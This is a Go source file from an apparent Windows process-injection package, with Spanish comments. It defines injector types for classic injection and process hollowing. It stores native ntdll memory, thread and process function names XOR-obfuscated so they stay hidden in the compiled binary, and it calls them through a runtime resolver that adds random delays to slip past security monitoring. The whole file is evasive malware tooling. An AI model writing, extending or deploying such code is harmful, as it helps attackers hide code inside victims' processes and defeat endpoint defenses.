package injection

import (
	"errors"
	"math/rand"
	"time"

	"golang.org/x/sys/windows"
)

// Log permite que main.go inyecte su logger en el paquete.
var Log interface {
	Println(v ...any)
	Printf(format string, v ...any)
} = &discardLogger{}

type discardLogger struct{}

func (d *discardLogger) Println(v ...any)                 {}
func (d *discardLogger) Printf(format string, v ...any)   {}

type InjectionType int

const (
	ProcessInjection InjectionType = iota
	ProcessHollowing
)

type ProcessInjector interface {
	Inject(targetProc string, payload []byte) error
}

func NewInjector(t InjectionType) (ProcessInjector, error) {
	switch t {
	case ProcessInjection:
		return &ClassicInjector{}, nil
	case ProcessHollowing:
		return &DLLInjector{}, nil
	default:
		return nil, errors.New("unsupported")
	}
}

func FromString(name string) (InjectionType, error) {
	switch name {
	case "ProcessInjection":
		return ProcessInjection, nil
	case "ProcessHollowing":
		return ProcessHollowing, nil
	default:
		return -1, errors.New("unknown")
	}
}

// _xk es la clave XOR para desobfuscar nombres de funciones en tiempo de ejecución.
const _xk = byte(0x5A)

// Nombres de funciones NT cifrados con XOR 0x5A — no aparecen como strings en el binario.
var (
	_sAlloc        = []byte{0x14, 0x2E, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x3B, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23}
	_sWrite        = []byte{0x14, 0x2E, 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23}
	_sProtect      = []byte{0x14, 0x2E, 0x0A, 0x28, 0x35, 0x2E, 0x3F, 0x39, 0x2E, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23}
	_sResume       = []byte{0x14, 0x2E, 0x08, 0x3F, 0x29, 0x2F, 0x37, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E}
	_sQueueApc     = []byte{0x14, 0x2E, 0x0B, 0x2F, 0x3F, 0x2F, 0x3F, 0x1B, 0x2A, 0x39, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E}
	_sCreateThread = []byte{0x14, 0x2E, 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x1F, 0x22}
	_sTerminate    = []byte{0x14, 0x2E, 0x0E, 0x3F, 0x28, 0x37, 0x33, 0x34, 0x3B, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29}
)

// _d decodifica un nombre de función en tiempo de ejecución.
func _d(enc []byte) string {
	b := make([]byte, len(enc))
	for i, c := range enc {
		b[i] = c ^ _xk
	}
	return string(b)
}

// ntCall resuelve y llama una función de ntdll con un delay aleatorio.
// Retorna 0 para SUCCESS y WARNINGS de NTSTATUS (0x00-0xBFFFFFFF).
// Solo retorna non-zero para ERRORS reales (0xC0000000+).
func ntCall(nameEnc []byte, args ...uintptr) (uint32, error) {
	time.Sleep(time.Duration(80+rand.Intn(220)) * time.Millisecond)
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	r, _, _ := ntdll.NewProc(_d(nameEnc)).Call(args...)
	status := uint32(r)
	if status >= 0xC0000000 {
		return status, nil
	}
	return 0, nil
}
